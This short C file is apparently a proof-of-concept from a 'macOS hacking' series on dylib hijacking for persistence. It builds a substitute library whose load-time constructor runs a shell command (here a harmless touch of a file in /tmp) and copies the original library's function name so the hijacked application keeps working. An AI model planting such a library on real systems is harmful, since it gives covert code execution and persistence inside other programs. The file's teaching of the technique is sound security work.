/*
 * macOS hacking
 * persistence 3: dylib hijacking
 * evil library: hack
 * author: @cocomelonc
*/
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

// The constructor runs as soon as the dylib is loaded into memory
__attribute__((constructor))
void my_init() {
  printf("\nhijacked! malicious code is running in process: %d\n", getpid());
  // Persistence trigger: create a file in /tmp
  system("touch /tmp/meow.txt");
}

// We MUST provide the same function name as the original, 
// or the app will crash with "Symbol not found"
void hello_from_quack() {
  printf("malicious library: pretending to be a duck...\n");
}